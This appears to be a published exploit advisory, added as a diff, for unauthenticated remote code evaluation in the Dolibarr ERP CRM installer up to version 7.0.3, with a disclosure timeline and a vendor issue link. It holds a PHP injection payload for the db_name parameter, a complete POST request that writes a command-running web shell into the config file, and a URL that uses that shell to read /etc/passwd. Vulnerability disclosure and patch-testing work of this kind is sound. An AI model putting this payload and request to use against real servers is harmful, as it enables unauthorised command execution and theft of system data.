@@ -1,0 +1,32 @@
+# Exploit Title: Unauthenticated Remote Code Evaluation in Dolibarr ERP CRM =<7.0.3
+# Date: 06/29/2018
+# Exploit Author: om3rcitak - https://omercitak.com
+# Vendor Homepage: https://dolibarr.org
+# Software Link: https://github.com/Dolibarr/dolibarr
+# Version: =<7.0.3
+# Tested on: Unix, Windows
+
+## Technical Details
+URL: http://{domain}/{dolibarr_path}/install/step1.php
+Parameter Name: db_name
+Parameter Type: POST
+Attack Pattern: x\';system($_GET[cmd]);//
+
+## Steps to reproduce the behavior
+- Go to fresh install page.
+- Click "Next Step" button for create example config file (conf/conf.php)
+- Send this request:
+```
+POST {dolibarr_path}/install/step1.php HTTP/1.1
+Host: {domain}
+
+testpost=ok&action=set&main_dir=C%3A%2FAmpps%2Fwww&main_data_dir=C%3A%2FAmpps%2Fwww%2Fdocuments&main_url=http%3A%2F%2Flocalhost+&db_name=x%5C%27%3Bsystem(%24_GET%5Bcmd%5D)%3B%2F%2F&db_type=mysqli&db_host=localhost&db_port=3306&db_prefix=llx_&db_create_database=on&db_user=root&db_pass=root&db_create_user=on&db_user_root=root&db_pass_root=root&selectlang=auto
+```
+- Visit url and run the command: `http://{domain}/{dolibarr_path}/install/check.php?cmd=cat /etc/passwd`
+
+## Timeline
+- 06/29/2018 18:30 - Found vulnerability.
+- 06/29/2018 18:44 - Report vendor.
+- 06/29/2018 20:38 - Vulnerability fixed by vendor.
+
+GitHub Issue: https://github.com/Dolibarr/dolibarr/issues/9032
